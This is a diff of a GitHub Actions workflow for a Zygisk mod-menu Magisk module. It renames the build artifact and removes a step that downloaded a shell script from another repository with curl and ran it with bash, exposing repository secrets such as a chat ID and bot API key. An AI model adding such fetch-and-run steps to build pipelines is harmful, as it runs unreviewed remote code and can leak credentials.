@@ -19,20 +19,10 @@ jobs:
 
       with:
 
-        name: zygisk-imgui-modmenu
+        name: zygisk-modmenu
 
         path: out/magisk_module_release/
-    - name: ready compile...
-      run: |
-          curl https://raw.githubusercontent.com/QPLAYid/Kustom/main/miui.sh > miui.sh
-          chmod +x miui.sh
-          bash miui.sh
-      shell: bash
-      env:
-         CHATID: ${{ secrets.CHAT_ID }}
-         API_BOT: ${{ secrets.BOT_API }}
-         TYPE_KERNEL: ${{ secrets.EZA }}
-
+    
 
 
 
